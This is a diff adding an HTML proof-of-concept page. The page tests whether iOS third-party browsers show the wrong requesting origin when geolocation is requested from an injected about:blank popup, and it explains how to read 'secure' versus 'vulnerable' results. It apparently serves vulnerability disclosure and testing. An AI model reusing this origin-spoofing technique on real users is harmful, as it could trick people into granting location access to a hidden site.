@@ -1,0 +1,121 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PoC: Geolocation Origin Spoofing (iOS Third-Party Browsers)</title>
+    <style>
+        body { 
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; 
+            padding: 25px; 
+            line-height: 1.5; 
+            background-color: #f9f9fb;
+            color: #1c1c1e;
+        }
+        .container {
+            max-width: 600px;
+            margin: auto;
+            background: #ffffff;
+            padding: 30px;
+            border-radius: 16px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.08);
+        }
+        h2 { color: #ff3b30; margin-top: 0; }
+        p { color: #3a3a3c; }
+        .btn-launch { 
+            padding: 15px 30px; 
+            font-size: 17px; 
+            cursor: pointer; 
+            background-color: #007aff; 
+            color: white; 
+            border: none; 
+            border-radius: 12px;
+            font-weight: 600;
+            width: 100%;
+            transition: opacity 0.2s;
+        }
+        .btn-launch:active { opacity: 0.7; }
+        .comparison-box {
+            margin-top: 25px;
+            padding: 20px;
+            background: #f2f2f7;
+            border-radius: 12px;
+            font-size: 14px;
+        }
+        code { background: #e5e5ea; padding: 2px 4px; border-radius: 4px; font-family: monospace; }
+        .status-tag {
+            display: inline-block;
+            padding: 4px 8px;
+            border-radius: 6px;
+            font-weight: bold;
+            font-size: 12px;
+            margin-bottom: 10px;
+        }
+        .vulnerable { background: #ff3b30; color: white; }
+        .secure { background: #34c759; color: white; }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <span class="status-tag vulnerable">Vulnerability: UI Spoofing</span>
+    <h2>Geolocation Origin Spoofing</h2>
+    <p>This PoC demonstrates that browsers fail to correctly attribute the requesting origin when Geolocation is triggered from an <code>about:blank</code> popup.</p>
+    
+    <button class="btn-launch" onclick="launchPoc()">Launch Test Popup</button>
+
+    <div class="comparison-box">
+        <strong>How to interpret results:</strong>
+        <ul style="padding-left: 20px; margin-top: 10px;">
+            <li><span style="color: #34c759; font-weight: bold;">(Secure):</span> Shows <code>"https://nuribnuu.github.io"</code> in the dialog.</li>
+            <li><span style="color: #ff3b30; font-weight: bold;">(Vulnerable):</span> Shows <code>""</code> / <code>empty origin</code> / <code>null</code> in the dialog.</li>
+        </ul>
+    </div>
+</div>
+
+<script>
+    function launchPoc() {
+        // Open the blank popup
+        const pocWindow = window.open("about:blank", "_blank", "width=500,height=500");
+        
+        if (!pocWindow) {
+            alert("Please allow popups for this PoC to work.");
+            return;
+        }
+
+        // Content to inject into the about:blank window
+        const content = `
+            <div style="font-family: -apple-system; padding: 40px; text-align: center;">
+                <h3 style="color: #1c1c1e;">Target Context: about:blank</h3>
+                <p style="color: #8e8e93;">Click below to trigger the permission dialog.</p>
+                <button id="geoBtn" style="
+                    padding: 18px 25px; 
+                    background: #ff3b30; 
+                    color: white; 
+                    border: none; 
+                    border-radius: 12px; 
+                    font-weight: bold;
+                    font-size: 16px;
+                    margin-top: 20px;
+                    box-shadow: 0 4px 12px rgba(255,59,48,0.3);
+                ">Trigger Geolocation</button>
+            </div>
+            <script>
+                document.getElementById('geoBtn').onclick = function() {
+                    navigator.geolocation.getCurrentPosition(
+                        (pos) => alert('Success! Location captured.'),
+                        (err) => alert('Dialog closed or Error: ' + err.message),
+                        { enableHighAccuracy: true }
+                    );
+                };
+            <\/script>
+        `;
+
+        // Injecting the code
+        pocWindow.document.write(content);
+        pocWindow.document.close();
+    }
+</script>
+
+</body>
+</html>
